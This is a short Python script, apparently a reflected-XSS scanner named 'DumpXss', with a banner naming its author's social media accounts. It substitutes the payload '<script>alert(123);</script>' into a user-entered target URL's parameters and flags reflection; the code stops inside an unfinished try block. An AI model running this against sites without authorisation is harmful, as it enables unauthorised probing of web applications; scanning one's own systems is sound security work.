import requests
import threading
from colorama import Fore, Back, Style


print(
        Fore.YELLOW +
         """
________                                             
\______ \  __ __  _____ _________  ___  ______ ______
 |    |  \|  |  \/     \\____ \  \/  / /  ___//  ___/
 |    `   \  |  /  Y Y  \  |_> >    <  \___ \ \___ \ 
/_______  /____/|__|_|  /   __/__/\_ \/____  >____  >
        \/            \/|__|        \/     \/     \/ 
                                          [ twitter.com/r00t_nasser ]
                                          [ Snapchat : aaa.saq ]
        """ + Fore.RESET)

print()
print()
url = input("Please Enter Target Url\t:")
payload = ["<script>alert(123);</script>"]
def Send_req(url,payload):
    #while url[-1] != '=':
     #   url = url[:-1]
    url = url.replace("=",f"={payload}")

    try:

        res = requests.get(url)
        if payload in res.text:
           print(Fore.GREEN +'XSS Found   -->','   ' , f"{url}" + Fore.RESET)


